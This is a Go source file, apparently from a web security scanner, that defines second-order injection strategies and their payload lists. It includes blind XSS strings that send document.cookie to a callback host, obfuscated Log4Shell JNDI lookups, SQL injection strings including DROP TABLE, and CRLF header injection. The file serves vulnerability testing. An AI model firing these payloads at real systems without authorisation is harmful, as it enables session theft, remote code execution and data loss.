package secondorder

// Strategy defines a second-order injection strategy.
type Strategy struct {
	Name         string
	Description  string
	InjectPoints []InjectPoint
	VerifyPoints []VerifyPoint
	PayloadType  string

	// InjectURL is the URL to inject the payload (used by factory strategies).
	InjectURL string
	// InjectParam is the parameter to inject into (used by factory strategies).
	InjectParam string
	// InjectMethod is the HTTP method for injection (used by factory strategies).
	InjectMethod string
	// VerifyURL is the URL to check for triggered payload (used by factory strategies).
	VerifyURL string
	// VerifyMethod is the HTTP method for verification (used by factory strategies).
	VerifyMethod string
	// Payloads are the payloads to inject (used by factory strategies).
	Payloads []string
}

// InjectPoint defines where to inject the payload.
type InjectPoint struct {
	Location string // "header", "query", "body", "cookie"
	Field    string // specific field name
}

// VerifyPoint defines where to verify the payload triggered.
type VerifyPoint struct {
	Location string // "response_body", "response_header", "callback"
	Pattern  string // regex pattern to match
}

// Strategy name constants.
const (
	StrategyBlindXSS        = "BlindXSS"
	StrategySecondOrderSQLi = "SecondOrderSQLi"
	StrategyLogInjection    = "LogInjection"
	StrategyJNDIHeaders     = "JNDIHeaders"
)

// DefaultStrategies returns all built-in second-order detection strategies.
func DefaultStrategies() []Strategy {
	return []Strategy{
		blindXSSStrategy(),
		secondOrderSQLiStrategy(),
		logInjectionStrategy(),
		jndiHeadersStrategy(),
	}
}

// blindXSSStrategy returns the Blind XSS detection strategy.
func blindXSSStrategy() Strategy {
	return Strategy{
		Name: StrategyBlindXSS,
		Description: "Inject XSS payloads in User-Agent, Referer, and form fields. " +
			"These trigger when admin views logs or reports.",
		InjectPoints: []InjectPoint{
			{Location: "header", Field: "User-Agent"},
			{Location: "header", Field: "Referer"},
			{Location: "header", Field: "X-Forwarded-For"},
			{Location: "body", Field: "username"},
			{Location: "body", Field: "email"},
			{Location: "body", Field: "comment"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `<(script|img|svg|iframe)[^>]*>`},
			{Location: "callback", Pattern: ""},
		},
		PayloadType: "xss",
	}
}

// secondOrderSQLiStrategy returns the Second-Order SQL Injection strategy.
func secondOrderSQLiStrategy() Strategy {
	return Strategy{
		Name: StrategySecondOrderSQLi,
		Description: "Inject SQL payloads via registration or profile update. " +
			"Trigger via search or report endpoints.",
		InjectPoints: []InjectPoint{
			{Location: "body", Field: "username"},
			{Location: "body", Field: "email"},
			{Location: "body", Field: "name"},
			{Location: "query", Field: "search"},
			{Location: "query", Field: "q"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `(?i)(sql|syntax|mysql|postgresql|oracle|ORA-|sqlite)`},
			{Location: "response_body", Pattern: `(?i)(error in your SQL|quoted string not properly terminated)`},
		},
		PayloadType: "sqli",
	}
}

// logInjectionStrategy returns the Log Injection detection strategy.
func logInjectionStrategy() Strategy {
	return Strategy{
		Name: StrategyLogInjection,
		Description: "Inject CRLF and format strings in logged headers " +
			"(User-Agent, X-Forwarded-For) to test log injection.",
		InjectPoints: []InjectPoint{
			{Location: "header", Field: "User-Agent"},
			{Location: "header", Field: "X-Forwarded-For"},
			{Location: "header", Field: "Referer"},
			{Location: "header", Field: "X-Original-URL"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `FakeHeader:\s*injected`},
			{Location: "response_header", Pattern: `FakeHeader`},
		},
		PayloadType: "crlf",
	}
}

// jndiHeadersStrategy returns the JNDI Headers injection strategy.
func jndiHeadersStrategy() Strategy {
	return Strategy{
		Name: StrategyJNDIHeaders,
		Description: "Inject JNDI lookups in all injectable headers " +
			"(User-Agent, Referer, X-Forwarded-For, X-Api-Version, etc.).",
		InjectPoints: []InjectPoint{
			{Location: "header", Field: "User-Agent"},
			{Location: "header", Field: "Referer"},
			{Location: "header", Field: "X-Forwarded-For"},
			{Location: "header", Field: "X-Api-Version"},
			{Location: "header", Field: "X-Client-IP"},
			{Location: "header", Field: "X-Originating-IP"},
			{Location: "header", Field: "Accept-Language"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `(?i)(javax\.naming|jndi|log4j|JndiLookup)`},
			{Location: "callback", Pattern: ""},
		},
		PayloadType: "jndi",
	}
}

// DefaultBlindXSSStrategy returns a Strategy configured for blind/stored XSS
// detection using the inject-then-verify pattern.
func DefaultBlindXSSStrategy(injectURL, verifyURL string) Strategy {
	return Strategy{
		Name: StrategyBlindXSS,
		Description: "Inject XSS payloads at injectURL, verify at verifyURL " +
			"for stored cross-site scripting.",
		InjectPoints: []InjectPoint{
			{Location: "header", Field: "User-Agent"},
			{Location: "header", Field: "Referer"},
			{Location: "header", Field: "X-Forwarded-For"},
			{Location: "body", Field: "comment"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `<(script|img|svg|iframe)[^>]*>`},
		},
		PayloadType: "xss",
		InjectURL:   injectURL,
		InjectParam: "input",
		VerifyURL:   verifyURL,
		Payloads:    blindXSSPayloads(""),
	}
}

// DefaultSecondOrderSQLiStrategy returns a Strategy configured for second-order
// SQL injection detection using the inject-then-verify pattern.
func DefaultSecondOrderSQLiStrategy(injectURL, verifyURL string) Strategy {
	return Strategy{
		Name: StrategySecondOrderSQLi,
		Description: "Inject SQL payloads at injectURL (registration/update), " +
			"verify at verifyURL (profile/report) for stored SQL injection.",
		InjectPoints: []InjectPoint{
			{Location: "body", Field: "username"},
			{Location: "body", Field: "email"},
			{Location: "query", Field: "search"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `(?i)(sql|syntax|mysql|postgresql|oracle|ORA-|sqlite)`},
			{Location: "response_body", Pattern: `(?i)(error in your SQL|quoted string not properly terminated)`},
		},
		PayloadType: "sqli",
		InjectURL:   injectURL,
		InjectParam: "username",
		VerifyURL:   verifyURL,
		Payloads:    secondOrderSQLiPayloads(),
	}
}

// DefaultLogInjectionStrategy returns a Strategy configured for log injection
// detection. The same URL is used for inject and verify since log injection
// payloads are sent via headers and the response is checked immediately.
func DefaultLogInjectionStrategy(targetURL string) Strategy {
	return Strategy{
		Name: StrategyLogInjection,
		Description: "Inject CRLF and format string payloads in headers " +
			"to detect log injection vulnerabilities.",
		InjectPoints: []InjectPoint{
			{Location: "header", Field: "User-Agent"},
			{Location: "header", Field: "X-Forwarded-For"},
			{Location: "header", Field: "Referer"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `FakeHeader:\s*injected`},
			{Location: "response_header", Pattern: `FakeHeader`},
		},
		PayloadType: "crlf",
		InjectURL:   targetURL,
		InjectParam: "User-Agent",
		VerifyURL:   targetURL,
		Payloads:    logInjectionPayloads(),
	}
}

// GetPayloads returns the payloads for a given strategy.
func GetPayloads(strategy Strategy, callbackDomain string) []string {
	switch strategy.Name {
	case StrategyBlindXSS:
		return blindXSSPayloads(callbackDomain)
	case StrategySecondOrderSQLi:
		return secondOrderSQLiPayloads()
	case StrategyLogInjection:
		return logInjectionPayloads()
	case StrategyJNDIHeaders:
		return jndiHeaderPayloads(callbackDomain)
	default:
		return nil
	}
}

// blindXSSPayloads returns XSS payloads for blind/stored testing.
func blindXSSPayloads(callbackDomain string) []string {
	cb := callbackDomain
	if cb == "" {
		cb = "xss.callback.invalid"
	}
	return []string{
		`"><img src=x onerror=fetch('` + cb + `')>`,
		`"><script src=` + cb + `></script>`,
		`'"><svg/onload=fetch('` + cb + `')>`,
		`"><input onfocus=fetch('` + cb + `') autofocus>`,
		`<img src=x onerror="new Image().src='` + cb + `?c='+document.cookie">`,
	}
}

// secondOrderSQLiPayloads returns SQL injection payloads for second-order testing.
func secondOrderSQLiPayloads() []string {
	return []string{
		`'; WAITFOR DELAY '0:0:5'--`,
		`' OR '1'='1'--`,
		`admin'--`,
		`' UNION SELECT NULL,NULL,NULL--`,
		`1; DROP TABLE test--`,
	}
}

// logInjectionPayloads returns log injection payloads.
func logInjectionPayloads() []string {
	return []string{
		"\r\nFakeHeader: injected",
		"\r\n\r\n<script>alert(1)</script>",
		"%0d%0aFakeHeader:%20injected",
		"${jndi:ldap://127.0.0.1/a}",
		"%00admin",
	}
}

// jndiHeaderPayloads returns JNDI header injection payloads.
func jndiHeaderPayloads(callbackDomain string) []string {
	cb := callbackDomain
	if cb == "" {
		cb = "jndi.callback.invalid"
	}
	return []string{
		"${jndi:ldap://" + cb + "/a}",
		"${jndi:rmi://" + cb + "/a}",
		"${jndi:dns://" + cb + "/a}",
		"${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://" + cb + "/a}",
		"${${::-j}${::-n}${::-d}${::-i}:ldap://" + cb + "/a}",
	}
}
